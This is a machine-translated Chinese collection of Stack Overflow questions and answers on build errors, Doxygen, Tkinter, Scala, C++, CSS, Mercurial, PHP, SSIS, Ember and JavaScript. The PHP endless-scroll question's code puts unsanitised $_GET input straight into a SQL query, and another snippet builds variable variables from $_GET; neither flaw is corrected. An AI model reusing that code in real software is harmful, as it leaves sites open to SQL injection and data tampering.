在我丢失清单之前，我收到一个错误，它找不到文件夹的其他内容（exe、pdb 等），错误 MSB3113（[链接](http://msdn.microsoft.com/en-us/library/ms228164%28v=vs.80%29.aspx)）

我尝试过的事情（其中一些是牵强的，我知道）：

*   我尝试为所有丢失的文件重命名伪造文件
*   我试图找到已删除的文件，但找不到
*   我尝试删除 Debug/Release 文件夹的所有内容并进行干净的构建
*   我尝试删除调试/发布目录

如果你能想到任何我可以尝试的东西，请告诉我。我的问题似乎与[这个](https://stackoverflow.com/questions/9775449/could-not-find-file-obj-debug-program-exe-manifest)有点相似。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-06-19T12:26:32.477

这就是我最终解决问题的方法 - 结果我在我的项目中包含了我的`bin`和`obj`目录。对于遇到相同问题的任何人，只需右键单击并“从项目中排除”。完成此操作后，清理并重建您的项目，您应该一切顺利。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-08T14:23:41.090

就我而言，文件 app.manifest 已签出。该文件位于我的 Winforms 项目中 Properties 文件夹下。我从 Pending Changes 窗口中选择了这个文件并执行了“undo pending checkout”。之后构建成功。这发生在 Visual Studio 2008 中。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-03-11T17:08:57.490

为我工作：属性 => 构建 => 生成序列化程序集 => 从自动更改为关闭

# whitespace - doxygen 中的无关 HTML

> ID：11091545
> 
> 赞同：0
> 
> 时间：2012-06-18T21:44:45.920
> 
> 标签：whitespace, doxygen

我正在尝试使用 doxygen 将代码片段导入 HTML。代码片段有几行长，我已经使用 <pre> 标记对其进行了预格式化。但是，当生成 HTML 时，doxygen 正在插入

`<div class="line">`

在我的代码段的每一行之前。结果是生成的 HTML 代码片段的每一行之间都有额外的空间。我该如何摆脱这个？我只想要带有预先格式化的空格的代码片段。

这是 doxygen 1.8.1.1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T13:40:50.000

我遇到了同样的问题并报告了一个针对 DoxyGen 的错误。见链接：[https ://bugzilla.gnome.org/show_bug.cgi?id=681135](https://bugzilla.gnome.org/show_bug.cgi?id=681135)

答案很简单：“line”类是最近才添加的，它需要更新自定义 CSS 文件。就我而言，解决方案很简单：

*   在 DoxyWizard 中打开项目
*   转到“专家”视图并配置 HTML 输出
*   删除自定义 CSS 的条目
*   运行一次 DoxyWizard
*   将默认 CSS 中的 div.line 和 div.line.glow 定义复制到您的自定义 CSS 中并根据需要进行修改
*   要开心

HTH，尼克

# algorithm - kd-Tree 是 K-means 聚类的替代方案吗？

> ID：11091546
> 
> 赞同：5
> 
> 时间：2012-06-18T21:44:46.713
> 
> 标签：algorithm, computer-vision, cluster-analysis, k-means, kdtree

我正在使用 BOW 对象检测，并且正在编码阶段。我已经看到了一些`kd-Tree`在编码阶段使用的实现，但大多数著作都表明`K-means`集群是要走的路。

两者有什么区别？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T21:54:59.950

在目标检测中，k-means 用于量化描述符。kd-tree 可用于搜索带或不带量化的描述符。每种方法都有其优点和缺点。具体来说，当描述符维度的数量超过 20 时，kd-trees 并不比暴力搜索好多少。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-18T21:54:56.277

`kd-tree`AFAIK 用于标记阶段，它的速度要快得多，当对大量组进行聚类时，数百甚至数千组，然后简单地采用到每个组的所有距离的 argmin 的简单方法，k-means`http://en.wikipedia.org/wiki/K-means_clustering`是实际的聚类算法，虽然并不总是很精确，但速度很快，一些实现返回组，而其他组和训练数据集的标签，这是我通常使用的[http://docs.scipy.org/doc/scipy/reference /generated/scipy.spatial.cKDTree.html](http://docs.scipy.org/doc/scipy/reference/generated/scipy.spatial.cKDTree.html)结合[http://docs.scipy.org/doc/scipy/reference/generated/scipy.cluster.vq.kmeans2.html](http://docs.scipy.org/doc/scipy/reference/generated/scipy.cluster.vq.kmeans2.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-08-16T14:56:23.997

`kd-Tree`和`K-means`算法是两种不同类型的聚类方法。

这里有几种聚类方法如下：

*   `kd-Tree`是一种[层次聚类](/questions/tagged/hierarchical-clustering "显示标记为“分层聚类”的问题")方法（基于中值）。
*   `K-means`是一种基于均值的聚类方法。
*   `GMM`（高斯混合模型）是一种基于概率的聚类方法（软聚类）。
*   等等

* * *

[更新]：

[通常，有两种聚类方法，软聚类和硬聚类。像 GMM 这样的概率聚类是软聚类类型，将对象分配给具有概率的聚类，而其他聚类是硬聚类，将对象绝对分配给聚类。]

# python - 在 Tkinter 类 python 中居中和调整窗口框架的大小

> ID：11091548
> 
> 赞同：2
> 
> 时间：2012-06-18T21:45:01.570
> 
> 标签：python, class, tkinter

我想根据屏幕尺寸使用比率将窗口框架广告设置为中心。但是我看不到在哪里正确修改我的代码来执行这样的程序。我的程序是以下示例：

```
class App:
    def __init__(self,master):
        ScreenSizeX = master.winfo_screenwidth()  # Get screen width [pixels]
        ScreenSizeY = master.winfo_screenheight() # Get screen height [pixels]
        ScreenRatio = 0.8                              # Set the screen ratio for width and height
        FrameSizeX  = int(ScreenSizeX * ScreenRatio)
        FrameSizeY  = int(ScreenSizeY * ScreenRatio)
        FramePosX   = (ScreenSizeX - FrameSizeX)/2 # Find left and up border of window
        FramePosY   = (ScreenSizeY - FrameSizeY)/2

        print FrameSizeX,FrameSizeY,FramePosX,FramePosY

        #geometry(str(self.winfo_screenwidth())+"x"+str(self.winfo_screenheight())+"+0+0")
        frame = Tkinter.Frame(master)
        frame.pack()

        self.button = Tkinter.Button(frame,text="Quit",fg="red",command=frame.quit)
        self.button.pack()

        self.hi_there = Tkinter.Button(frame,text="Hi!",command=self.say_hi)
        self.hi_there.pack()

    def say_hi(self):
        print "hello !"

if __name__ == "__main__":
    root = Tkinter.Tk()
    app = App(root)
    root.mainloop() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-19T01:25:09.893

你为什么注释掉这`geometry`条线？它非常接近你真正需要的东西。尝试这个：

```
master.geometry("%sx%s+%s+%s" % (FrameSizeX,FrameSizeY,FramePosX,FramePosY)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T06:46:12.567

这是适用于此功能的最终代码：

```
import Tkinter #Python integrated tool kit for interfaces

class App:
    def __init__(self,master):
        # Define frame size and position in the screen :
        ScreenSizeX = master.winfo_screenwidth()  # Get screen width [pixels]
        ScreenSizeY = master.winfo_screenheight() # Get screen height [pixels]
        ScreenRatio = 0.8                              # Set the screen ratio for width and height
        FrameSizeX  = int(ScreenSizeX * ScreenRatio)
        FrameSizeY  = int(ScreenSizeY * ScreenRatio)
        FramePosX   = (ScreenSizeX - FrameSizeX)/2 # Find left and up border of window
        FramePosY   = (ScreenSizeY - FrameSizeY)/2
        master.geometry("%sx%s+%s+%s"%(FrameSizeX,FrameSizeY,FramePosX,FramePosY))
        frame = Tkinter.Frame(master)
        frame.pack()

        self.button = Tkinter.Button(frame,text="Quit",fg="red",command=frame.quit)
        self.button.pack()

        self.hi_there = Tkinter.Button(frame,text="Hi!",command=self.say_hi)
        self.hi_there.pack()

    def say_hi(self):
        print "hello !"

if __name__ == "__main__":
    root = Tkinter.Tk()
    app = App(root)
    root.mainloop() 
```

# scala - 绑定对象的字段/方法

> ID：11091562
> 
> 赞同：1
> 
> 时间：2012-06-18T21:46:31.713
> 
> 标签：scala, generics, collections, existential-type, type-bounds

如何将对象的字段/方法与类型绑定？

我正在尝试做：

```
object CRUDable {

  private val allCRUDables = scala.collection.mutable.Map[String, CRUDableMeta[_]]()
  def add(crudable: CRUDableMeta[_]) { allCRUDables += (crudable.name -> crudable) } 
```

我的编译器说：

```
type arguments [_$5] do not conform to trait CRUDableMeta's type parameter bounds [T <: etam.jpa.crud.CRUDable[T]] 
```

我需要地图来接受任何类型的 CRUDableMeta[_]。

在此先感谢，埃塔姆。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T00:08:46.050

我冒昧地构建一个一般案例，因为我不知道 CRUD 并且它不起作用：

```
trait Data[T]
trait Meta[T <: Data[T]] { def name: String }
val all = collection.mutable.Map[String, Meta[_]]() 
```

现在编译器会告诉你到底哪里出了问题

```
def add(c: Meta[_]) { all += c.name -> c } 
```

它说：

```
error: type arguments [_$1] do not conform to trait
       Meta's type parameter bounds [T <: Data[T]] 
```

因此，虽然 Scala 让您可以`Map`毫无抱怨地构造 （老实说我不知道​​为什么），但当您尝试将值实际存储在映射中时，您会遇到`Meta`类型参数的界限。`T`

解决方案是使用以下任一形式。(1) 方法的类型参数：

```
def add[T <: Data[T]](c: Meta[T]) { all += c.name -> c } 
```

(2) 存在型

```
def add(c: Meta[T] forSome { type T <: Data[T] }) { all += c.name -> c } 
```

不要问我关于（2）的问题，我一直忘记存在类型的全部内容......也许其他人可以在这里提供关于（1）或（2）是否更好的见解。（[对相关问题的唯一答案](https://stackoverflow.com/questions/5374610/when-to-use-existential-type-in-scala)表明 (1) 和 (2) 几乎相同，其中 (1) 还允许您随后引用 type `T`。虽然这里没有必要，但它仍然是更具可读性的版本， 我会说）

# c++ - c++命名空间与类

> ID：11091567
> 
> 赞同：0
> 
> 时间：2012-06-18T21:46:58.547
> 
> 标签：c++, class, namespaces

`ns.cpp`：

```
 #include <iostream>

    namespace ns {        // want to access this globally
      class A ;
    }

    class ns::A {
    public:
     int x1;
     char s1[128];
    };

    int main()
    {
    int doit();
    //using namespace ns;

      ns::A a;

      a.x1= 2;

      std::cout << "pre " << a.x1 << "\n" ;
      doit();
      std::cout << "post " << a.x1 << "\n" ;
    } 
```

`ns_call.cpp`：

```
 namespace ns {
     class A;
    }

    class ns::A {
    public:
     int x1;
     char s1[];
    };

    using namespace ns;

    int
    doit()
    {
       extern ns::A a;

       a.x1= 100;
    } 
```

在 ns.cpp 中，在命名空间中声明了一个类。类定义如下。

类中的变量将被全局访问。这是命名空间的目标。

ns_call.cpp 然后访问该类成员的 1，x1。

这两个文件在 Fedora 14 中使用 gcc 5.4.1 编译成功。运行输出为：

```
pre 2
post 2 
```

我期望“发布 100”，因为我想在全球范围内访问 A 类中的 int x1。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:56:51.130

`extern`, s 或前向声明似乎都不`namespace`是您认为的意思。

如果您想引入一个可以访问我的多个翻译单元的名称（当您说“全局”时，您的意思似乎是），您可以将这些定义放在一个头文件中，并将`#include`该头文件放在您想使用的任何地方。

您实际上在做的是`class A`在每个翻译单元中一遍又一遍地引入（例如，在每个 CPP 文件中）。这充其量是对 ODR 的违反。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:30:48.227

我只是要帮助您解决问题，而您绝对必须注意有关 ODR（一个定义规则）的其他答案并修复您的设计。

在`ns.cpp`文件中，您必须将该行`ns::A a;`移出`main()`函数。将其放在文件范围内（例如，就在 . 之前`main`。）此外，在`ns_call.cpp`文件中，也将行`extern ns::A a;`移出函数。

注意：你可能需要也可能不需要做第二部分，整个方法可能会也可能不会。我现在无法访问编译器。

我不得不再次同意其他评论，即这种设计有缺陷，它*会让*你头疼。

# css - 我在 app.css 中所做的更改不会更新页面

> ID：11091570
> 
> 赞同：2
> 
> 时间：2012-06-18T21:47:28.020
> 
> 标签：css, html, background-image, footer, zurb-foundation

我正在使用 Zurb Foundation 工具包，它包含两个样式表，一个是用于编辑和添加元素的 app.css。添加到 app.css 的以下内容不会在我的索引页面上反映或更新。从我所见，这应该非常简单，但对我没有用。我正在使用 Aptana Studio 3。

```
body {
    background-image:url('carbonfiber.png');
    background-repeat:no-repeat;
    background:#333333;
    background-position:center;
}

#content {
    margin-bottom:2000px
}

#footer {
    position:absolute;
    bottom:0;
    width:100%;
    height:40px;
    clear:both;
    background-color:#C00 padding-bottom: 500px
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-06T02:54:52.203

您需要将更改添加到 app.scss

只需执行以下操作，打开命令行：（在您处理项目时保持此屏幕打开） compass watch your-project-folder

然后对您的 .scss 所做的任何更改都将编译为 .css

使用 zurb 基础，我首先创建另一个名为 _main.scss 的文件（在 sass 文件夹下），然后使用 @import main 从 /sass/app.scss 文件中调用它；对 _main.scss 所做的任何更改都会编译到名为 /main.css 的新样式表中，并自动添加到 app.css 文件中。

希望很清楚。

# javascript - IEscrollTop 我发现在指定了 size 属性的 IE（IE7 和 IE9）中使用 select 元素时，使用 .scrollTop 会导致一些奇怪的行为。我希望有办法解决它。如果用户手动滚动到某个位置，则脚本会将其滚动到另一个位置，如果用户单击向上或向下，则从脚本运行之前的位置开始滚动。这是一个非常简单的示例：http://jsfiddle.net/7yHH7/ 如果您手动滚动，请注意位置，然后用按钮“脚本”滚动（一次或多次），然后再次开始手动滚动，您将请注意，在 IE 中，滚动

> ID：11091572
> 
> 赞同：3
> 
> 时间：2012-06-18T21:47:31.740
> 
> 标签：javascript, html, internet-explorer, scrolltop

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-06T15:43:59.563

我不太确定 .scrolltop 函数的语法，但是，我知道为此编写了各种 jQuery 脚本。@ [http://www.dynamicdrive.com/dynamicindex2/](http://www.dynamicdrive.com/dynamicindex2/)有一些非常不错的脚本可能值得一看。抱歉，我帮不上什么忙。

# mercurial - 将 Mercurial 存储库克隆到 public_html

> ID：11091575
> 
> 赞同：0
> 
> 时间：2012-06-18T21:47:53.653
> 
> 标签：mercurial, clone

我想将 Mercurial 存储库克隆到我的 Web 服务器上的 /public_html 文件夹中。我的 Mercurial 项目看起来像这样......

```
- /ProjectName
    - /public
    - /application
    - /config
    - /library 
```

我想要的只是将“ProjectName”的内容放入我的 /public_html 文件夹中。不幸的是，克隆存储库包括“ProjectName”并且所有子文件夹都在那里。

知道如何在没有符号链接的情况下完成此操作吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-19T01:44:43.320

只是把它放在那里，你可能不想要一个完整的克隆，`public_html`除非你真的想要网络上曾经存在的每个版本。这本身并没有什么问题，但是由于您将拥有一个`.hg`人`public_html`，甚至可以从中克隆您的存储库。

相反，请考虑使用`hg archive`导出所有文件的命令，因为它们存在于特定修订版中，并将它们放置在您想要的任何位置。

例如：

```
cd your_clone
hg archive --rev release /public_html 
```

这需要标签指向的代码`release`（可以是标签、书签或分支头）并将文件（但不是完整历史克隆）放在 /public_html 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:20:51.157

我实际上找到了一个简单的方法来做到这一点。

```
hg clone https://me@bitbucket.org/me/ProjectName "/home/website/public_html" 
```

public_html 必须为空才能将存储库克隆到其中，因此我将所有内容移出，克隆了存储库，然后将预先存在的文件和文件夹移回。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:55:49.560

这是您可以遵循的简单步骤：

```
cd /public_html
hg init .
hg pull ../pathto/ProjectName/ 
```

这将`ProjectName`在`public_html`不创建`/public_html/ProjectName`.

但它仍会将 mercurial 存储库（文件和文件夹）中的所有资源复制到您的目录中。

# php - While 循环遍历数据两次

> ID：11091577
> 
> 赞同：0
> 
> 时间：2012-06-18T21:47:58.867
> 
> 标签：php, html, ajax, while-loop

所以我有这个代码，我已经为此烦恼了几个小时，我和我的朋友都找不到解决方案。它根据从数据库中提取的降序 ID 显示评论。这是一种用于消除分页的无尽滚动类型的脚本。出于某种原因，当我点击页面底部并运行脚本时，while 循环会遍历数据两次。因此，如果它应该显示评论 ID 5 - 10，则显示 10、9、8、7、6、5、10、9、8、7、6、5；而不是 10、9、8、7、6、5。这将是一个非常大的代码，但我希望你能帮助我解决我的问题。提前致谢！！

```
<?php 
include("../mysql_server/connect_to_mysql.php");

if($_GET['lastPost']) {
$mysqlQuery = mysql_query('SELECT * FROM `reviews` WHERE `review_id` < "' . $_GET['lastPost'] . '" ORDER BY `review_id` DESC LIMIT 0, 10');

while ($review_row = mysql_fetch_assoc($mysqlQuery)) {

    $review_title = $review_row['review_title'];
    $user_id = $review_row['user_id'];
    $user_firstname = $review_row['user_firstname'];
    $user_lastname = $review_row['user_lastname'];
    $review_id = $review_row['review_id'];
    $review_body = $review_row['review_body'];
    $review_referral = $review_row['review_referral'];

        // Code to append text for title
        // strip tags to avoid breaking any html
        $review_title = strip_tags($review_title);

        if (strlen($review_title) > 30) {

            // truncate string
            $stringCut = substr($review_title, 0, 30);

            // make sure it ends in a word so assassinate doesn't become ass...
            $review_title = substr($stringCut, 0, strrpos($stringCut, ' ')).'...'; 
        }
        // Code to append text and add Read More
        // strip tags to avoid breaking any html
        $review_body = strip_tags($review_body);

        if (strlen($review_body) > 230) {

            // truncate string
            $stringCut = substr($review_body, 0, 230);

            // make sure it ends in a word so assassinate doesn't become ass...
            $review_body = substr($stringCut, 0, strrpos($stringCut, ' ')).'... <a class="reviewContentLink" href="../../pages/home_page/post_content.php?id='. $review_id .'">See Full Post</a>'; 
        } else {
            $review_body .= '<a class="reviewContentLink" href="../../pages/home_page/post_content.php?id='. $review_id .'">See Full Post</a>';
        }

    $review_date = $review_row['review_date'];
        $review_date = date_create($review_date);
        $review_date = date_format($review_date, 'g:ia \o\n F jS\, Y');
    $user_firstname = $review_row['user_firstname'];
    $review_rating = $review_row['rating'];

    ///////  Mechanism to Display Pic. See if they have uploaded a pic or not  //////////////////////////
    $check_pic = "../members/$user_id/thumb_image01.jpg";
    $default_pic = "../members/0/image01.jpg";
        if (file_exists($check_pic)) {
            $review_pic = "<img src=\"../$check_pic\" width=\"80px\" />"; 
        } else {
            $review_pic = "<img src=\"../$default_pic\" width=\"80px\" />"; 
        }

    include_once('../include/star_display.php');            

    //Pull the Review Category from the row
    $review_category = "";
    $review_category = $review_row['review_category'];
    include_once('../include/review_category.php');

    //Pull the Referral Category from the row
    $referral_category = $review_row['referral_category'];
    include_once('../include/referral_category.php');

    //Code for URL for Each Review
    $review_url = $review_row['review_url'];
    if (!function_exists('remove_http')) {
        function remove_http($url = '') {
            return(str_replace(array('http://','https://'), '', $url));
        }
    }
   //CODE TO DISTINGUISH REFERRALS FROM REVIEWS         
        //Final Output List
        if($review_referral == 0) {
                //Code for Displaying URL Link
                $review_url = remove_http($review_url);
                $review_url = "<a target='_BLANK' href='http://". $review_url ."'>Buy It Here!</a> ";

                    echo ''. $review_id .' '. $review_referral .'
                    <div class="display_newsfeed" id="'.$review_id.'">
                        <table id="'.$review_id.'" style="width:98.5%; border:#00B347 1px solid; margin:10px 0px 20px 10px;">
                        <td style="float:left; width:15%; border-right:1px solid #DDDDDD; margin:5px 0px 5px 0px;">
                                            <div class="review_user_name"><a href="../../pages/profile_page/profile_page.php?id='. $user_id .'">'. $user_firstname.' '. $user_lastname .'</a></div>
                                            <div class="review_prof_pic"><a href="../../pages/profile_page/profile_page.php?id='. $user_id .'">'. $review_pic .'</a></div>
                                            <div class="bought_it_newsfeed">Bought It!</div>
                                </td>
                                <td style="float:right; width:82%;">
                                        <div class="review_title_p">
                                            <p><span class="review_title">'. $review_title .'</span><span class="review_date_p">'. $review_date .'</span><span class="review_stars">'. $review_stars .'</span></p>
                                        </div>
                                        <div class="review_read_more">
                                            <p class="review_body_p">'. $review_body .'</p><br />
                                            <div>
                                                <div style="float:left;" class="review_black_font_link">Website:'.$review_url.'</div>
                                                <div style="float:right; margin-right:20px;" class="review_black_font_link">Category: '.$review_category_post .'</div>
                                            </div>
                                        </div>
                                </td>

                        </table>
                        <hr style="margin:0px 20px 0px 20px;" />    
                        </div>
                                    ';

              } else if($review_referral == 1) {    
                //Code for Displaying URL Link
                $review_url = remove_http($review_url);
                $review_url = "<a target='_BLANK' href='http://". $review_url ."'>Click Here</a> ";

                echo '
                        <div class="display_newsfeed" id="'.$review_id.'">
                        <table id="'.$review_id.'" style="width:98.5%; border:#0099FF 1px solid; margin:10px 0px 20px 10px;">
                        <td style="float:left; width:15%; border-right:1px solid #DDDDDD; margin:5px 0px 5px 0px;">
                                            <div class="review_user_name"><a href="../../pages/profile_page/profile_page.php?id='. $user_id .'">'. $user_firstname.' '. $user_lastname .'</a></div>
                                            <div class="review_prof_pic"><a href="../../pages/profile_page/profile_page.php?id='. $user_id .'">'. $review_pic .'</a></div>
                                            <div class="referral_newsfeed">Referral</div>
                                </td>
                                <td style="float:right; width:82%;">
                                        <div class="review_title_p">
                                            <p><a href="../../pages/home_page/post_content.php?id='. $review_id .'">'. $review_title .'</a><span class="review_date_p">'. $review_date .'</span><span class="review_stars">'. $review_stars .'</span></p>
                                        </div>
                                        <div class="review_read_more">
                                            <p class="review_body_p">'. $review_body .'</p><br />
                                            <div>
                                                <div style="float:left;" class="review_black_font_link">Business Website:'. $review_url .'</div>
                                                <div style="float:right; margin-right:20px;" class="review_black_font_link">Category: '. $referral_category_post .'</div>
                                            </div>
                                        </div>
                                </td>

                        </table>
                        <hr style="margin:0px 20px 0px 20px;" />    
                        </div>
                                    ';
                }
}             

} else {
 echo "didn't work";
}

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:55:53.280

您还确定数据库中没有损坏吗？你可以试试

```
while ($review_row = mysql_fetch_assoc($mysqlQuery)) {
 echo $review_row['review_title'] . "<br />";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T02:37:30.570

您可以发布调用/发布到此脚本的代码吗？正如其他人所说，这段代码很可能被调用了两次。

另外，如果您直接在数据库中运行此查询，会返回什么？

```
SELECT * 
FROM `reviews` 
WHERE `review_id` < (insert the id here) 
ORDER BY `review_id` DESC 
LIMIT 0, 10 
```

# python - 以纯文本形式返回本地化天气的 Web 服务？

> ID：11091581
> 
> 赞同：1
> 
> 时间：2012-06-18T21:48:04.770
> 
> 标签：python, bash, curl, wget, weather

我想制作一个非常轻量级的脚本来讲述天气。我需要获取天气状态（“多云”、“雷声”）、温度（°F）、风速（英里/小时）和湿度（百分比），所有这些都基于邮政编码。我想用 curl 来完成这一切。

我想直接下载数据，比如“curl [http://www.example.com/weather/04101](http://www.example.com/weather/04101) ”，然后让它以纯文本形式提供给我数据。这是一种可能性，还是我必须四处挖掘并处理函数来获取数据？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T01:48:53.683

您可能会发现[http://www.wunderground.com/weather/api/](http://www.wunderground.com/weather/api/)很有用 - 他们提供免费（每天最多 500 次使用）服务，通过邮政编码或地理位置提供当地天气预报。

对于纯文本，您可能还会发现 NOAA NOW 报告很有用 - [http://www.nws.noaa.gov/view/validProds.php?prod=NOW&node=KCLE](http://www.nws.noaa.gov/view/validProds.php?prod=NOW&node=KCLE)

# sql-server-2008 - 如何在 SSIS 的执行 SQL 任务中使用参数映射？

> ID：11091583
> 
> 赞同：4
> 
> 时间：2012-06-18T21:48:16.180
> 
> 标签：sql-server-2008, ssis

我正在尝试`Key`使用 SSIS 中的简单选择语句通过`Execute SQL Task`. 但是没有运气弄清楚这个错误。

我使用了一个字符串数据类型的输入变量，并在`Execute SQL Task`.

> 执行查询“SELECT cast([Key] as Int) FROM Table where column = ?” 失败并出现以下错误：“将结果提取到类型 (DBTYPE_I4) 的变量中时发生错误”。可能的失败原因：查询有问题，“ResultSet”属性设置不正确，参数设置不正确，或连接未正确建立。

注意：`Key`列的数据类型是`tinyint`

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2015-08-11T13:29:30.607

当参数的默认数据类型保持为“LONG”而不是任何必要的数据类型时，会出现此消息...在您的情况下，这应该是“BYTE”

[![参数映射](../Images/cce6dcdb50c6ad4278c5e73d02b9f27d.png)](https://i.stack.imgur.com/P1fmF.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-19T16:15:55.870

将查询写为 -> SELECT cast([Key] as Int) as Key FROM Table where column = ?

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-19T02:42:34.337

Tinyint不是 i4，它是[DT_UI1](http://sqlblogcasts.com/blogs/simons/archive/2006/02/24/SSIS-data-flows-and-tinyint.aspx)。[http://msdn.microsoft.com/en-us/library/ms345165.aspx](http://msdn.microsoft.com/en-us/library/ms345165.aspx)

如果您将 SSIS 类型更改为字节，那么您应该能够将查询结果分配给该值。

```
Variable User::input  Data Type Byte  Value 2
Variable User::output Data Type Byte  Value 0 
```

来源查询`SELECT CAST(1 AS tinyint) AS [key], ? AS foo`

执行 SQL 任务、OLE DB CM、单行结果集 参数映射选项卡

*   变量名：用户::输入
*   数据类型：字节
*   参数名称：0

第 1 列的结果映射到 User::output

执行 SQL 任务后检查值，结果为 2（预期）

# php - 根据复选框组合数组

> ID：11091585
> 
> 赞同：0
> 
> 时间：2012-06-18T21:48:38.047
> 
> 标签：php

我有一个带有复选框的表格。

我想要它，以便在选中复选框时，它包含一个数组。

```
<input type="checkbox" name="main" value="main" checked> Main/unsorted<br />
<input type="checkbox" name="art" value="art" checked> Art/literature/music<br />
<input type="checkbox" name="games" value="games" checked> Games/gaming<br /> 
```

如果 main 被选中，包括数组'main'，如果 art 被选中，包括数组'art'，等等。

我已经尝试过，但找不到适用于这种情况的功能。

编辑：我有点作弊，现在正在这样做。

```
foreach($_GET as $get) {
    $end = array_merge($end, $$get);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:01:46.310

根据您的信息，听起来您想根据选中的复选框合并一个数组？我的假设是否正确？

你正在寻找这样的东西吗？

```
<?php

$combinationArray = array();
$mainArray = array('item1','item2','item3');
$artArray = array('item4','item5','item6');
$gamesArray = array('item7','item8','item9');
if(isset($_POST['main']) && $_POST['main']=='main'){
    $combinationArray = array_merge($combinationArray,$mainArray);
}
if(isset($_POST['art']) && $_POST['art']=='art'){
    $combinationArray = array_merge($combinationArray,$artArray);
}
if(isset($_POST['games']) && $_POST['games']=='games'){
    $combinationArray = array_merge($combinationArray,$gamesArray);
}
?> 
```

HTML：

```
<form action="yourpage.php" method="post">
    <input type="checkbox" name="main" value="main" checked> Main/unsorted<br />
    <input type="checkbox" name="art" value="art" checked> Art/literature/music<br />
    <input type="checkbox" name="games" value="games" checked> Games/gaming<br />

    <button>
        Submit
    </button>
</form> 
```

# ember.js - 如何在 emberjs 中进行控制器初始化

> ID：11091588
> 
> 赞同：0
> 
> 时间：2012-06-18T21:48:41.187
> 
> 标签：ember.js

我的`State`路由器中有一个使用我的视图类连接插座的路由器`UserApp.RegistrationView`。为该视图创建正确的控制器类`RegistrationController`，似乎可以根据约定神奇地工作：

```
registration: Em.State.extend({
    route: '/reg',
    registrationModel: null,
    connectOutlets: function (router) {
        router.get('applicationController').connectOutlet(UserApp.RegistrationView, UserApp.RegistrationModel.create());
    }
}) 
```

所以我不控制控制器的创建，但是我想在创建控制器时运行一些初始化代码。最好的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:19:24.043

什么样的初始化？控制器被查找，然后被框架注入。无论如何，使用最新版本的 emberjs，您可以将控制器的实例传递给 connectOutlet。

@见[https://github.com/emberjs/ember.js/commit/be69395f5eec4187b1df052d7386bcda45f79475](https://github.com/emberjs/ember.js/commit/be69395f5eec4187b1df052d7386bcda45f79475)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T09:11:51.450

你最好直接从 master 分支上去构建 ember.js 的源代码。代码注释提供了更多信息。

# javascript - JavaScript中的unicode到utf-8

> ID：11091589
> 
> 赞同：4
> 
> 时间：2012-06-18T21:48:42.670
> 
> 标签：javascript, jquery

我有像这样的服务器的输出

```
["alex", "\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd"] 
```

我想使用 js 或 jquery 将它转换为 ["alex", "to its right language"]

我试过

```
function encode_utf8( s )
{
   return unescape( encodeURIComponent( s ) )
} 
```

但无法正常工作

有什么帮助吗？
提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-21T18:10:19.687

我不确定通过显示的示例输出“LIKE”是什么意思...

但是如果你得到`["alex", "\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd"]`并将它分配给一个变量，比如

```
var foo = ["alex", "\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd"];
// alert(foo[1]) results in "��������" which actually means
// the engine has at least tried to resolve the characters 
```

例如，如果您传入正确的字符代码，例如：

```
var foo = ["alex", "\u003cp\u003emy UTF paragraph\u003c/p\u003e"];
// alert(foo[1]) results in "<p>my UTF paragraph</p>" which seems correct to me... 
```

在浏览器控制台中尝试上面的示例（在当前的 Chrome 中至少对我有用）

另一方面，如果您`"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd"`每次都收到，那么我假设与评论者类似，您的回复在您使用 JavaScript 处理之前已经搞砸了

This [article](http://mathiasbynens.be/notes/javascript-identifiers) shows nicely that using Unicode characters is valid for variable naming so the same should apply to string content.

# c# - 消除 EF 4 STE 对象图中的循环

> ID：11091590
> 
> 赞同：0
> 
> 时间：2012-06-18T21:48:53.923
> 
> 标签：c#, wcf, entity-framework, entity-framework-4, self-tracking-entities

在尝试序列化 EF STE 对象图时，我回到了我之前写的关于 StackOverflowException的[帖子中的“绘图板”......在未能成功调整 IIS7 中的堆栈大小后，如此](https://stackoverflow.com/questions/11039450/stackoverflowexception-serializing-ste-ef-object-graph)[处](http://blogs.msdn.com/b/tom/archive/2008/03/31/stack-sizes-in-iis-affects-asp-net.aspx)所述，我决定去沿着寻找根本原因的道路...

我相信这与 EF 模型的设计方式有关。

简化后，我有一个父实体和一个子实体。Child 实体有两个返回给 Parent 的导航属性，例如 Child.Parent 和 Child.ParentUsed。自然地，父级有两个子级集合。

在仔细查看导致 StackOverflow 异常的数据后，我注意到这个对象图中有几个循环。我无法证明这一点，但我相当肯定循环导致了这个 StackOverflow 异常。

